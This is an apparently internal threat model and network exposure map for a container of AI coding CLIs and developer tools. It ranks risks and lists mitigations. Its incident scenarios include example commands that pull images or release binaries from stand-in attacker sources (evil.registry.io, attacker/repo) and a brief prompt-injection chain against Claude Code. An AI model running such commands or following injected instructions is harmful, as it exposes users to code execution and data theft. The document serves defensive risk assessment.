# Network Exposure Map

**Version:** 1.0.0
**Last Updated:** 2025-10-30
**System:** AI Assistant Container (xpai-ai-assistant-container)

## 1. Overview

This document maps the network exposure and external input processing for all components in the AI Assistant Container to support accurate risk assessment for vulnerability triage.

## 2. System Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   AI Assistant Container                         │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  User Interface Layer                                     │  │
│  │  - Claude Code CLI                                        │  │
│  │  - Gemini CLI                                             │  │
│  │  - Goose CLI                                              │  │
│  └──────────────┬───────────────────────────────────────────┘  │
│                 │                                                │
│  ┌──────────────▼───────────────────────────────────────────┐  │
│  │  Tool Layer                                               │  │
│  │  - crane (container operations)                           │  │
│  │  - gh (GitHub operations)                                 │  │
│  │  - git (version control)                                  │  │
│  │  - jq, curl (utilities)                                   │  │
│  └──────────────┬───────────────────────────────────────────┘  │
│                 │                                                │
│  ┌──────────────▼───────────────────────────────────────────┐  │
│  │  Runtime Layer                                            │  │
│  │  - Node.js v22.20.0                                       │  │
│  │  - Ubuntu 24.04 LTS base                                  │  │
│  └──────────────┬───────────────────────────────────────────┘  │
│                 │                                                │
└─────────────────┼────────────────────────────────────────────────┘
                  │
      ┌───────────┴─────────────┐
      │                         │
┌─────▼────────┐    ┌──────────▼────────┐
│  External    │    │  Internal          │
│  Networks    │    │  Resources         │
└──────────────┘    └───────────────────┘
```

## 3. Component Risk Classification

### High Risk Components (Direct External Input)

| Component | Version | External Input | Risk Level | Justification |
|-----------|---------|----------------|------------|---------------|
| **crane** | 0.20.6 | ✅ YES | **HIGH** | Pulls/pushes container images from public registries (Docker Hub, GHCR, Quay.io); parses OCI manifests, layers, and metadata from untrusted sources |
| **gh** | 2.82.0 | ✅ YES | **HIGH** | Interacts with GitHub APIs; processes repository data, issues, PRs, releases from public/private repos; executes downloaded binaries (extensions) |
| **Node.js** | 22.20.0 | ✅ YES | **HIGH** | Executes JavaScript including from npm packages; AI tools may execute user-provided code snippets; processes JSON/YAML configs |

### Medium-High Risk Components (Indirect External Input)

| Component | Version | External Input | Risk Level | Justification |
|-----------|---------|----------------|------------|---------------|
| **git** | OS default | ⚠️ INDIRECT | **MEDIUM-HIGH** | Clones repositories from remote URLs (could be malicious repos); processes git objects and configs; SSH/HTTPS connections |
| **curl** | OS default | ⚠️ INDIRECT | **MEDIUM-HIGH** | Downloads files from arbitrary URLs (used by AI tools and scripts); could fetch malicious payloads |
| **Claude Code** | 2.0.28 | ⚠️ INDIRECT | **MEDIUM** | Processes user prompts (natural language); may execute tool commands; uses APIs (Anthropic) |
| **Gemini CLI** | 0.10.0 | ⚠️ INDIRECT | **MEDIUM** | Processes user prompts (natural language); may execute tool commands; uses APIs (Google) |
| **Goose** | 1.12.1 | ⚠️ INDIRECT | **MEDIUM** | Processes user prompts (natural language); may execute tool commands; AI-assisted workflows |

### Low Risk Components (Internal Only)

| Component | Version | External Input | Risk Level | Justification |
|-----------|---------|----------------|------------|---------------|
| **jq** | OS default | ❌ NO | **LOW** | Processes JSON from local files or piped input; no network operations |
| **Ubuntu base** | 24.04 LTS | ❌ NO | **MEDIUM** | OS packages from Ubuntu repos (trusted); CA certificates for TLS |

## 4. Network Exposure Analysis

### External Network Connections

#### Public Container Registries (crane)

**Endpoints:**
- `registry-1.docker.io` (Docker Hub)
- `ghcr.io` (GitHub Container Registry)
- `quay.io` (Quay.io)
- Custom registries (configurable)

**Data Flow:**
```
[crane] → HTTPS → [Container Registry] → OCI Manifest + Layers
```

**Untrusted Input:**
- ✅ Container image manifests (JSON)
- ✅ Container layers (tar.gz archives)
- ✅ Image metadata and annotations
- ✅ Registry API responses

**Attack Vectors:**
- Malicious container images (malware in layers)
- Exploits in manifest/layer parsing
- Registry API vulnerabilities
- Man-in-the-middle attacks (if TLS compromised)

---

#### GitHub API (gh)

**Endpoints:**
- `api.github.com` (GitHub REST API)
- `github.com` (GitHub web/git)
- `objects.githubusercontent.com` (release assets)

**Data Flow:**
```
[gh] → HTTPS → [GitHub API] → JSON responses + binary assets
```

**Untrusted Input:**
- ✅ Repository metadata (JSON)
- ✅ Issue/PR content (Markdown, comments)
- ✅ Release assets (binaries, archives)
- ✅ GitHub Actions workflow files
- ✅ GitHub CLI extensions (executable code)

**Attack Vectors:**
- Malicious repositories (supply chain attacks)
- Exploits in JSON/Markdown parsing
- Malicious release binaries
- Compromised GitHub CLI extensions

---

#### AI Service APIs (Claude Code, Gemini CLI)

**Endpoints:**
- `api.anthropic.com` (Claude API)
- `generativelanguage.googleapis.com` (Gemini API)

**Data Flow:**
```
[AI CLI] → HTTPS → [AI Provider] → JSON responses (model outputs)
```

**Untrusted Input:**
- ⚠️ AI model outputs (generated text, code)
- ⚠️ API responses (JSON)

**Attack Vectors:**
- Prompt injection attacks (via AI responses)
- Exploits in API response parsing
- Malicious code suggestions from AI
- API endpoint compromise (low probability)

---

#### Git Remote Repositories (git)

**Endpoints:**
- Any HTTPS/SSH git remote (public or private)
- Common: `github.com`, `gitlab.com`, `bitbucket.org`

**Data Flow:**
```
[git] → HTTPS/SSH → [Git Remote] → Git objects (commits, trees, blobs)
```

**Untrusted Input:**
- ⚠️ Git objects (commits, trees, blobs)
- ⚠️ Repository configs (.gitconfig, .gitmodules)
- ⚠️ Git hooks (if enabled)

**Attack Vectors:**
- Malicious git repositories
- Exploits in git object parsing
- Malicious .gitmodules (submodule attacks)
- SSH key compromise

---

#### Arbitrary URLs (curl)

**Endpoints:**
- Any URL (HTTP/HTTPS)

**Data Flow:**
```
[curl] → HTTP/HTTPS → [Arbitrary Server] → Any content type
```

**Untrusted Input:**
- ✅ Arbitrary file downloads
- ✅ API responses (any format)

**Attack Vectors:**
- Downloading malicious files
- Server-side exploits (if curl vulnerabilities exist)
- Man-in-the-middle attacks

---

### Internal Network Connections

**None identified** - This container is designed for local development and CI/CD use; it does not connect to internal corporate networks or databases.

## 5. Data Flow Diagrams

### Crane (Container Registry Operations)

```
User Command
    ↓
[crane pull registry.io/image:tag]
    ↓
┌─────────────────────────────────────────┐
│ 1. TLS Handshake with registry.io       │
│ 2. Authenticate (if private registry)   │
│ 3. Fetch OCI manifest (JSON)            │  ← Untrusted input
│ 4. Parse manifest for layer digests     │  ← Parsing vulnerability risk
│ 5. Download each layer (tar.gz)         │  ← Untrusted input
│ 6. Extract and store locally            │  ← Extraction vulnerability risk
└─────────────────────────────────────────┘
    ↓
Container image available locally
```

**CVE Impact Analysis:**
- Go stdlib vulnerabilities in `crane` could allow:
  - Malicious manifest exploitation → RCE
  - Layer parsing exploits → container escape
  - TLS vulnerabilities → MITM attacks

---

### GitHub CLI (gh)

```
User Command
    ↓
[gh release download owner/repo]
    ↓
┌─────────────────────────────────────────┐
│ 1. TLS Handshake with api.github.com    │
│ 2. Authenticate (GitHub token)          │
│ 3. Fetch release data (JSON)            │  ← Untrusted input
│ 4. Parse release assets list            │  ← Parsing vulnerability risk
│ 5. Download asset binary                │  ← Untrusted input
│ 6. Save to filesystem                   │  ← File write vulnerability risk
└─────────────────────────────────────────┘
    ↓
Release asset downloaded
```

**CVE Impact Analysis:**
- Go stdlib vulnerabilities in `gh` could allow:
  - JSON parsing exploits → RCE
  - Malicious asset download → supply chain compromise
  - TLS vulnerabilities → credential theft

---

### AI Tools (Claude Code, Gemini CLI, Goose)

```
User Prompt
    ↓
[claude "Analyze this codebase"]
    ↓
┌─────────────────────────────────────────┐
│ 1. Parse user prompt (text)             │
│ 2. Execute tool commands (if allowed)   │  ← Command injection risk
│ 3. Send prompt to AI API (HTTPS)        │
│ 4. Receive AI response (JSON)           │  ← Untrusted input (AI-generated)
│ 5. Parse and display response           │  ← Parsing vulnerability risk
│ 6. Execute suggested actions (optional) │  ← Code execution risk
└─────────────────────────────────────────┘
    ↓
AI response displayed/executed
```

**CVE Impact Analysis:**
- Node.js vulnerabilities could allow:
  - Prompt injection → arbitrary code execution
  - JSON parsing exploits → RCE
  - Malicious AI responses → supply chain attacks

---

## 6. Risk Assessment Matrix

| Component | Network Exposure | Input Trust | Parsing Complexity | Overall Risk |
|-----------|------------------|-------------|-------------------|--------------|
| **crane** | Public registries | Untrusted | High (OCI, tar.gz) | **CRITICAL** |
| **gh** | Public GitHub | Untrusted | High (JSON, binaries) | **CRITICAL** |
| **Node.js** | AI APIs | Semi-trusted | High (JavaScript) | **HIGH** |
| **git** | Public repos | Untrusted | Medium (git objects) | **MEDIUM-HIGH** |
| **curl** | Any URL | Untrusted | Low (passthrough) | **MEDIUM** |
| **Claude Code** | Anthropic API | Semi-trusted | Medium (JSON) | **MEDIUM** |
| **Gemini CLI** | Google API | Semi-trusted | Medium (JSON) | **MEDIUM** |
| **Goose** | Block APIs | Semi-trusted | Medium (JSON) | **MEDIUM** |
| **jq** | Local only | Trusted | Low (JSON) | **LOW** |

## 7. CVE Impact Multipliers

When assessing CVE severity, apply these multipliers based on component exposure:

| Component | Base CVSS | Exposure Multiplier | Rationale |
|-----------|-----------|-------------------|-----------|
| **crane** | CVSS Score | **+1.5** | Processes untrusted container images from public registries |
| **gh** | CVSS Score | **+1.5** | Downloads untrusted binaries from public repositories |
| **Node.js** | CVSS Score | **+1.0** | Executes JavaScript, may run untrusted code |
| **git** | CVSS Score | **+0.5** | Clones public repos, parses git objects |
| **curl** | CVSS Score | **+0.5** | Downloads from arbitrary URLs |
| **AI Tools** | CVSS Score | **+0.0** | Semi-trusted input, controlled environments |

**Example:**
- CVE in Go stdlib (used by crane): CVSS 7.5 (HIGH)
- Exposure multiplier: +1.5 → **Effective severity: 9.0 (CRITICAL)**
- Rationale: Crane processes untrusted container images, making exploitation more likely

## 8. Compensating Controls

### Existing Mitigations

| Control | Description | Effectiveness |
|---------|-------------|---------------|
| **TLS Everywhere** | All external connections use HTTPS/TLS | Prevents MITM attacks |
| **Certificate Pinning** | Zscaler root CA installed, trusted CAs only | Reduces rogue CA risk |
| **Least Privilege** | Container runs as non-root user (aiAssistant) | Limits container escape impact |
| **No Sudo** | No privilege escalation possible | Prevents privilege escalation |
| **Minimal Attack Surface** | Only essential tools installed | Reduces exploitable code |
| **Image Digest Pinning** | Base image pinned to SHA256 digest | Prevents base image tampering |
| **Daily Scanning** | Nightly Trivy scans detect vulnerabilities | Fast detection (MTTD < 24h) |

### Recommended Additional Controls

| Control | Priority | Implementation |
|---------|----------|----------------|
| **Registry Allowlist** | HIGH | Configure crane to only pull from approved registries |
| **Content Trust** | MEDIUM | Enable Docker Content Trust for image signatures |
| **Network Policies** | MEDIUM | Restrict outbound connections to approved endpoints |
| **SBOM Validation** | MEDIUM | Verify SBOM signatures before deploying images |
| **Runtime Monitoring** | LOW | Monitor container for unexpected network connections |

## 9. Deployment Environment Considerations

### Local Development (Developer Workstations)

**Exposure Level:** MEDIUM-HIGH
**Rationale:** Developers may pull images from untrusted registries or clone public repos

**Mitigations:**
- Endpoint security (antivirus, EDR)
- Full-disk encryption
- MFA on workstation login

---

### CI/CD Pipelines (GitHub Actions)

**Exposure Level:** HIGH
**Rationale:** Automated workflows may process untrusted PRs or external dependencies

**Mitigations:**
- Separate runner pools for trusted vs. untrusted code
- Restricted network access (egress filtering)
- Short-lived credentials
- Audit logging for all actions

---

### Production Environments (Not Applicable)

**Note:** This container is NOT deployed in production; it's a development tool only.

## 10. Incident Scenarios

### Scenario 1: Malicious Container Image

**Trigger:** Developer runs `crane pull evil.registry.io/malware:latest`

**Attack Chain:**
1. `crane` connects to evil.registry.io
2. Malicious OCI manifest with crafted layer
3. Exploits CVE in Go stdlib (crane is built with Go 1.24.0)
4. Achieves RCE as `aiAssistant` user
5. Exfiltrates CUI from mounted workspace

**Impact:** HIGH (CUI breach, DFARS incident reporting required)

**Mitigations:**
- Patch crane to Go 1.24.8+ (fixes CVEs)
- Registry allowlist (prevent connections to untrusted registries)
- Network monitoring (detect unusual outbound connections)

---

### Scenario 2: Malicious GitHub Release Asset

**Trigger:** Developer runs `gh release download attacker/repo`

**Attack Chain:**
1. `gh` downloads malicious binary from GitHub release
2. Developer executes downloaded binary
3. Binary exploits CVE in Go stdlib (gh is built with Go 1.24.6)
4. Achieves RCE as `aiAssistant` user
5. Installs backdoor for persistent access

**Impact:** HIGH (persistent compromise, CUI at risk)

**Mitigations:**
- Patch gh to Go 1.24.8+ (fixes CVEs)
- Verify checksums/signatures before executing downloads
- Endpoint detection and response (EDR) on workstations

---

### Scenario 3: AI-Generated Malicious Code

**Trigger:** Claude Code generates malicious code via prompt injection

**Attack Chain:**
1. Attacker crafts prompt with injection payload
2. Claude API returns malicious code suggestion
3. Developer approves and executes suggested code
4. Code exploits Node.js vulnerability (if present)
5. Achieves RCE or data exfiltration

**Impact:** MEDIUM (requires user interaction, limited blast radius)

**Mitigations:**
- Prompt sanitization (if feasible)
- Code review before execution (user awareness)
- Sandboxing for AI-generated code execution

---

## 11. Threat Actors & Attack Vectors

| Threat Actor | Motivation | Likely Attack Vector |
|-------------|-----------|----------------------|
| **Nation-State APT** | Espionage (CUI theft) | Supply chain (malicious container images) |
| **Cybercriminals** | Ransomware, data theft | Exploit public vulnerabilities (unpatched CVEs) |
| **Insider Threat** | Sabotage, IP theft | Malicious code commits, credential abuse |
| **Script Kiddies** | Opportunistic | Automated scanning for known vulnerabilities |

## 12. Review & Updates

**Review Frequency:** Quarterly or when major architecture changes occur

**Triggers for Update:**
- New tools added to container
- New external dependencies
- New threat intelligence
- Post-incident lessons learned

---

**Document Approval:**

- [ ] Security Lead: _________________ Date: _______
- [ ] DevOps Lead: _________________ Date: _______
- [ ] System Owner: _________________ Date: _______

---

*This network exposure map is a living document and should be updated as the container evolves.*
